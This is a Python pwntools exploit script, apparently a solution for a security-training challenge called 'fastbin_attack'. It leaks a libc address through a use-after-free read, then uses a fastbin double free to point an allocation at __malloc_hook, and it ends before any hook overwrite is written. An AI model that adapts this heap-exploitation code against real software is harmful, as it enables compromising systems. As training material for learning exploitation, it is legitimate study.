#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host training.jinblack.it --port 10101 fastbin_attack
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fastbin_attack')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'training.jinblack.it'
port = int(args.PORT or 10101)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(['./ld-2.23.so', '--library-path', '.', './fastbin_attack'] + argv)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

libc = ELF('libc.so.6')

io = start()

def alloc(size):
	io.recvuntil(b'> ')
	io.sendline(b'1')
	io.recvuntil(b'Size: ')
	io.sendline(b'%d' % size)
	indexline = io.recvuntil(b'!')
	m = re.match(b'Allocated at index (\d+)!', indexline)
	return int(m.group(1))

def write_chunk(index, content):
	io.recvuntil(b'> ')
	io.sendline(b'2')
	io.recvuntil(b'Index: ')
	io.sendline(b'%d' % index)
	io.recvuntil(b'Content: ')
	io.send(content)

def read_chunk(index):
	io.recvuntil(b'> ')
	io.sendline(b'3')
	io.recvuntil(b'Index: ')
	io.sendline(b'%d' % index)
	data = io.recvuntil(b'Options:\n')
	return data[:-len(b'Options:\n')]
	
def free_chunk(index):
	io.recvuntil(b'> ')
	io.sendline(b'4')
	io.recvuntil(b'Index: ')
	io.sendline(b'%d' % index)

# there is a memory leak in the read: not checking if the chunk is freed
chunk_a = alloc(0x200)
chunk_b = alloc(0x30)
free_chunk(chunk_a)
libc_leak = u64(read_chunk(chunk_a)[:6] + b'\x00\x00')

libc_base = libc_leak - 0x3c4b78

print("[!] libc_base = ", libc_base)

libc.address = libc_base

malloc_hook = libc.symbols['__malloc_hook']

'''
now we perform fast bin atk
we allocate a chunk with size of a fast bin
second fast bn
free of first
free of the second

'''

SIZE = 0x60

chunk_1 = alloc(SIZE)
chunk_2 = alloc(SIZE)

free_chunk(chunk_1)
free_chunk(chunk_2)
free_chunk(chunk_1)

chunk_A = alloc(SIZE)
write_chunk(chunk_A, p64(malloc_hook))

chunk_B = alloc(SIZE)
chunk_C = alloc(SIZE)

chunk_D = alloc(SIZE)



io.interactive()

